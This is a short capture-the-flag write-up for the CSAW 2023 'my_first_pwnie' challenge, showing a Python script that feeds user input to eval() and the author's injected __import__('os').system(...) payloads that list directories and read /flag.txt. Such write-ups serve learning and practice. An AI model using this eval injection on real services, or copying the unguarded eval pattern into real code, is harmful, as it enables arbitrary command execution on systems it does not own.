---
Source: https://ctf.csaw.io/challenges#my_first_pwnie-30
created: 2023-09-16
tags:
  - ctf
  - writeups
  - csaw2023
Type: "[[Fleeting notes]]"
---
Description:
```
You must be this 👉 high to ride.

Note: flag is in `/flag.txt`

Author: `ElykDeer`

---

Connect with:

`nc intro.csaw.io 31137`

 [my_first_pwnie.py](https://ctf.csaw.io/files/aad33fd8e9d2e834d61f2c3a8aadbf81/my_first_pwnie.py?token=eyJ1c2VyX2lkIjo4MjYsInRlYW1faWQiOjM0NCwiZmlsZV9pZCI6MjN9.ZQXWAQ.hyK738hwmxOAfNpHWIphTh8_AfA "my_first_pwnie.py")
```
After downloading the my_first_pwnie.py. I opened it.
```python
#!/usr/bin/env python3

# Pwn mostly builds on top of rev.
# While rev is more about understanding how a program works, pwn is more about figuring out how to exploit a program to reach the holy grail: Arbitrary Code Execution
#
# If you can execute arbitrary code on a system, that system might as well be yours...because you can do whatever you want with it! (this is the namesake of "pwn".....if you pwn a system, you own the system)
# Of course, that comes with the limitations of the environment you are executing code in...are you a restricted user, or a super admin?
# Sometimes you can make yourself a super admin starting from being a restricted user.....but we're not gonna do that right now.
#
# For now, I want you to figure out how to execute arbitrary commands on the server running the following code.
#
# To prove to me that you can excute whatever commands you want on the server, you'll need to get the contents of `/flag.txt`

try:
  response = eval(input("What's the password? "))
  print(f"You entered `{response}`")
  if response == "password":
    print("Yay! Correct! Congrats!")
    quit()
except:
  pass

print("Nay, that's not it.")

```
After searching online I found out that eval function is vulnerable. We can use it to execute any python code exploiting this function.
At first, I tried with this in the password field.
```python
__import__('os').system('date')
```
The output was:
```
Sat Sep 16 16:22:59 UTC 2023
```
Great!
Then, I used the command ls to see the files inside the current folder.
```python
__import__('os').system('ls')
```
Output:
```
my_first_pwnie
```
So, the flag.txt file is not in the current folder.
Then, I executed:
```python
__import__('os').system('ls /')
```
The output was:
```
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
Great! The flag is in the root folder.
All is left is just one command:
```python
__import__('os').system('cat /flag.txt')
```
It displays the flag:
```
csawctf{neigh______}
```